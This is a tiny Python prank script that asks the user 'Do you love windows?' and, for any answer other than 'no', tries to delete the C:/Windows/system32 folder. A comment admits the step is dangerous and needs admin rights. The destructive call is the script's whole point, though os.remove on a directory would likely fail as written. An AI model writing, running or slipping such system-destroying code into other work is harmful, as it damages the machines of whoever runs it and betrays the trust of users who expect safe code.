import os

answer = input("Do you love windows? ")

if answer.lower() == "no":
    print("Good")
else: 
    # Warning: This does requires admin rights and this is dangerous!
    try:
        os.remove("C:/Windows/system32") 
    except OSError as e:
        print(f"Error: {e}")